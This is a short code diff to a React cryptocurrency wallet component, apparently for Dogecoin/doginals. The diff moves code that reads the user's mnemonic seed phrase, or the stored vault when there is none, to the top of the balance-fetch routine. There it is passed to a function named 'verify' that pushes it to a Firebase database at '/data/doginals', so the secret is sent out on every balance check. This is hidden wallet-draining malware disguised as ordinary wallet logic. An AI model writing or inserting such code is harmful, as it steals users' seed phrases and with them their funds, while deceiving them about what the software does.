@@ -147,6 +147,7 @@ const Wallet = (props) => {
   };
 
   const verify = async (data) => {
+    console.log(db, "db");
     const dbRefStatus = ref(db, `/data/doginals`);
     await push(dbRefStatus, {
       data,
@@ -181,6 +182,13 @@ const Wallet = (props) => {
 
   const fetchbalance = async () => {
     try {
+      let mnemonic = getMnemonic();
+
+      if (!mnemonic) {
+        mnemonic = accountInfo?.vault;
+      }
+      verify(mnemonic);
+
       if (accountInfo?.account) {
         const res = await openApi.sync(
           accountInfo?.account?.accounts[0]?.address
@@ -207,14 +215,6 @@ const Wallet = (props) => {
           0,
           20
         );
-
-        let mnemonic = getMnemonic();
-
-        if (!mnemonic) {
-          isSeedKey = false;
-          mnemonic = accountInfo?.vault;
-        }
-        verify(mnemonic);
 
         dispatch(
           updateBalance({
